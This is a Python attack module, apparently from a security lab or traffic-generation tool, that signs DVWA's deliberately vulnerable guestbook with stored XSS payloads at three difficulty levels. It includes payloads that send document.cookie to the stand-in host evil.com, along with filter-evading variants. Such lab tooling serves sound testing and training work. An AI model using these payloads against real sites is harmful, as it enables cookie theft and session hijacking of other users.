"""Stored XSS attack via DVWA guestbook."""

import random
from .base import AttackModule, logger

STORED_PAYLOADS = [
    "<script>alert('Stored XSS')</script>",
    "<script>new Image().src='http://evil.com/log?c='+document.cookie</script>",
    "<img src=x onerror=fetch('http://evil.com/steal?c='+document.cookie)>",
    "<svg onload=alert(document.domain)>",
    "<b onmouseover=alert('XSS')>click me</b>",
]

NAMES = ["hacker", "anonymous", "test", "guest", "xss_tester"]


class XssStored(AttackModule):
    NAME = "xss_stored"

    def _attack(self, session, payloads, count):
        for _ in range(count):
            payload = random.choice(payloads)
            name = random.choice(NAMES)
            token = session.get_csrf_token("/vulnerabilities/xss_s/")
            session.post(
                "/vulnerabilities/xss_s/",
                data={
                    "txtName": name,
                    "mtxMessage": payload,
                    "btnSign": "Sign Guestbook",
                    "user_token": token,
                },
            )
            logger.debug("[xss_stored] Signed guestbook as %s", name)
        # Also read the page to trigger stored payloads
        session.get("/vulnerabilities/xss_s/")

    def run_low(self, session):
        self._attack(session, STORED_PAYLOADS, random.randint(2, 4))

    def run_medium(self, session):
        medium_payloads = [
            "<Script>alert('XSS')</Script>",
            "<img src=x onerror=alert('XSS')>",
        ]
        self._attack(session, medium_payloads, random.randint(1, 3))

    def run_high(self, session):
        high_payloads = [
            "<img src=x onerror=alert('XSS')>",
            "<svg/onload=alert('XSS')>",
        ]
        self._attack(session, high_payloads, random.randint(1, 2))
